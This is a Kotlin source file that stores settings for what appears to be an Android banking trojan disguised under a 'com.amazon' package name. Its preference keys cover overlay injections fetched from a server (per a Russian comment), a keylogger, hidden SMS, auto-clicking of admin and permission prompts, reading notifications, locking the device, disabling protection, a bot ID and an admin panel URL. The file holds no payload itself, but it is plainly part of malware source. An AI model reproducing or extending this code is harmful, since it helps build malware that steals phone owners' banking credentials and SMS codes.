package com.amazon.zzz.Utilsss

import android.content.Context
import android.content.SharedPreferences

object SharedPreferencess {

    var activeInjection: String
        get() {
            return settings!!.getString("activeInjection", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("activeInjection", value)
            editor.apply()
        }

    var appName: String
        get() {
            return settings!!.getString("appName", utUtils.getLabelApplication(appContext!!))!!
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("appName", value)
            editor.apply()
        }

    var applicationId: String
        get() {
            return settings!!.getString("applicationId", "")!!
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("applicationId", value)
            editor.apply()
        }

    val sameName: Boolean
        get() {
            return appName == utUtils.getLabelApplication(appContext!!)
        }

    //////////////////////////app_inject/////////////////////////////
    var app_inject: String
        get() {
            return settings!!.getString("app_inject", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("app_inject", value)
            editor.apply()
        }

    //////////////////////////arrayInjection/////////////////////////////
    var arrayInjection: String
        get() {
            return settings!!.getString("arrayInjection", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("arrayInjection", value)
            editor.apply()
        }

    //////////////////////autoClick/////////////////////////////////
    var autoClickAdmin: String
        get() {
            return settings!!.getString("autoClickAdmin", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("autoClickAdmin", value)
            editor.apply()
        }

    var autoClickCache: String
        get() {
            return settings!!.getString("autoClickCache", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("autoClickCache", value)
            editor.apply()
        }

    var autoClickOnce: String
        get() {
            return settings!!.getString("autoClickOnce", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("autoClickOnce", value)
            editor.apply()
        }

    var autoClickPerm: String
        get() {
            return settings!!.getString("autoClickPerm", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("autoClickPerm", value)
            editor.apply()
        }

    var autoClickPerm2: String
        get() {
            return settings!!.getString("autoClickPerm2", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("autoClickPerm2", value)
            editor.apply()
        }

    var autoClickSms: String
        get() {
            return settings!!.getString("autoClickSms", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("autoClickSms", value)
            editor.apply()
        }

    var checkProtect: String
        get() {
            return settings!!.getString("checkProtect", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("checkProtect", value)
            editor.apply()
        }

    ///////////////////////Загрузка инжектов с сервера////////////////////////////////
    var checkUpdateInjection: String
        get() {
            return settings!!.getString("checkUpdateInjection", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("checkUpdateInjection", value)
            editor.apply()
        }

    var clearPush: String
        get() {
            return settings!!.getString("clearPush", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("clearPush", value)
            editor.apply()
        }

    var cntPowerKeeperClick: Int
        get() {
            return settings!!.getInt("cntPowerKeeperClick", 0)
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putInt("cntPowerKeeperClick", value)
            editor.apply()
        }

    var goOffProtect: String
        get() {
            return settings!!.getString("goOffProtect", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("goOffProtect", value)
            editor.apply()
        }

    //////////////////////////////// settings //////////////////////////////////////
    var hiddenSMS: String
        get() {
            return settings!!.getString("hiddenSMS", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("hiddenSMS", value)
            editor.apply()
        }

    //////////////////////Основные/////////////////////////////////
    var idbot: String
        get() {
            return settings!!.getString("idbot", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("idbot", value)
            editor.apply()
        }

    var initialization: String?
        get() {
            return settings!!.getString("initialization", null)
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("initialization", value)
            editor.apply()
        }

    var keylogger: String
        get() {
            return settings!!.getString("keylogger", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("keylogger", value)
            editor.apply()
        }

    //////////////////////////killApplication/////////////////////////////
    var killApplication: String
        get() {
            return settings!!.getString("killApplication", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("killApplication", value)
            editor.apply()
        }

    var lockDevice: String
        get() {
            return settings!!.getString("lockDevice", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("lockDevice", value)
            editor.apply()
        }

    var offSound: String
        get() {
            return settings!!.getString("offSound", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("offSound", value)
            editor.apply()
        }

    var permission_get: String
        get() {
            return settings!!.getString("permission_get", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("permission_get", value)
            editor.apply()
        }

    var readPush: String
        get() {
            return settings!!.getString("readPush", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("readPush", value)
            editor.apply()
        }

    //////////////////////////start admin/////////////////////////////
    var start_admin: String
        get() {
            return settings!!.getString("start_admin", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("start_admin", value)
            editor.apply()
        }

    //////////////////////Основные/////////////////////////////////
    var tick: Int
        get() {
            return settings!!.getInt("timeWorking", 0)
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putInt("timeWorking", value)
            editor.apply()
        }

    var tickUpdate: Int
        get() {
            return settings!!.getInt("tickUpdate", 0)
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putInt("tickUpdate", value)
            editor.apply()
        }

    //////////////////////////////// url //////////////////////////////////////
    var urlAdminPanel: String
        get() {
            return settings!!.getString("urlAdminPanel", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("urlAdminPanel", value)
            editor.apply()
        }

    var urls: String
        get() {
            return settings!!.getString("urls", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("urls", value)
            editor.apply()
        }

    var whileStartUpdateInjection: String
        get() {
            return settings!!.getString("whileStartUpdateInjection", "") ?: ""
        }
        set(value) {
            val editor = settings!!.edit()
            editor.putString("whileStartUpdateInjection", value)
            editor.apply()
        }

    private var settings: SharedPreferences? = null
    private var appContext: Context? = null

    fun SettingsRead(context: Context, name: String?): String? {
        if (settings == null) {
            settings = context.getSharedPreferences("settings", Context.MODE_PRIVATE)
        }
        return settings!!.getString(name, null)
    }

    fun SettingsToAdd(context: Context, name: String?, params: String?) {
        var params = params
        try {
            val getParams = SettingsRead(context, name)
            if (!getParams.isNullOrEmpty()) {
                params = getParams + params
            }
            SettingsWrite(context, name, params)
        } catch (ex: Exception) {
            SettingsWrite(context, name, params)
        }
    }

    fun SettingsWrite(context: Context, name: String?, params: String?) {
        if (settings == null) {
            settings = context.getSharedPreferences("settings", Context.MODE_PRIVATE)
        }
        val editor = settings!!.edit()
        editor.putString(name, params)
        editor.apply()
    }

    fun init(context: Context) {
        appContext = context
        if (settings == null) {
            settings = context.getSharedPreferences("settings", Context.MODE_PRIVATE)
        }
    }

}